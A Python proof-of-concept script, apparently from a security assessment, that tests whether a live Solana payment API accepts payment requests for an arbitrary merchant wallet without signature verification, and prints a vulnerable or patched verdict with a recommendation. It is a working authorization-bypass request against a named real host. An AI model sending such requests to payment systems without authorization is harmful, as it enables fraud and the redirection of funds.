#!/usr/bin/env python3
"""
AUTHZ-VULN-02 Test: Unauthorized Merchant Wallet Manipulation
Tests if POST /api/payments/create accepts arbitrary merchant wallet addresses
without proper signature verification.
"""

import requests
import json

def test_authz_vuln_02():
    print("=" * 70)
    print("AUTHZ-VULN-02: Unauthorized Merchant Wallet Manipulation Test")
    print("=" * 70)
    print()

    # Test configuration
    target_url = "https://solana-blik.vercel.app/api/payments/create"

    # Arbitrary merchant wallet (system program ID - clearly not our wallet)
    test_payload = {
        "amount": 1.5,
        "merchantWallet": "11111111111111111111111111111111"
    }

    headers = {
        "Content-Type": "application/json"
    }

    print(f"Target URL: {target_url}")
    print(f"Method: POST")
    print(f"Headers: {headers}")
    print(f"Request Body:")
    print(json.dumps(test_payload, indent=2))
    print()
    print("-" * 70)
    print("Executing request...")
    print("-" * 70)
    print()

    try:
        # Make the POST request
        response = requests.post(
            target_url,
            json=test_payload,
            headers=headers,
            timeout=10
        )

        # Print results
        print(f"Status Code: {response.status_code}")
        print()
        print("Response Headers:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        print()

        print("Response Body:")
        try:
            response_json = response.json()
            print(json.dumps(response_json, indent=2))
        except:
            print(response.text)

        print()
        print("=" * 70)
        print("VULNERABILITY ASSESSMENT")
        print("=" * 70)

        # Analyze the response
        if response.status_code == 200:
            try:
                response_data = response.json()
                if "paymentId" in response_data and "status" in response_data:
                    print("Status: VULNERABLE ⚠️")
                    print()
                    print("Finding:")
                    print("  The endpoint accepted an arbitrary merchant wallet address")
                    print("  without proper authorization or signature verification.")
                    print()
                    print("Evidence:")
                    print(f"  - Received HTTP 200 OK")
                    print(f"  - Payment ID created: {response_data.get('paymentId')}")
                    print(f"  - Payment status: {response_data.get('status')}")
                    print()
                    print("Impact:")
                    print("  An attacker can create payment requests impersonating ANY")
                    print("  merchant wallet address, potentially redirecting funds to")
                    print("  unauthorized wallets.")
                    print()
                    print("Recommendation:")
                    print("  Implement signature verification to ensure only the owner")
                    print("  of a wallet can create payments for that wallet address.")
                else:
                    print("Status: UNEXPECTED RESPONSE")
                    print("Response does not match expected vulnerable pattern.")
            except:
                print("Status: UNEXPECTED RESPONSE")
                print("Unable to parse JSON response.")
        elif response.status_code == 400:
            print("Status: POTENTIALLY PATCHED ✓")
            print()
            print("The endpoint rejected the request with HTTP 400.")
            print("This suggests validation or authorization checks may be in place.")
        elif response.status_code == 401 or response.status_code == 403:
            print("Status: PATCHED ✓")
            print()
            print("The endpoint properly rejected unauthorized merchant wallet.")
        else:
            print(f"Status: UNEXPECTED ({response.status_code})")
            print("Received unexpected status code.")

    except requests.exceptions.RequestException as e:
        print(f"Error: Request failed - {str(e)}")
        print()
        print("Status: UNABLE TO TEST")

    print("=" * 70)

if __name__ == "__main__":
    test_authz_vuln_02()
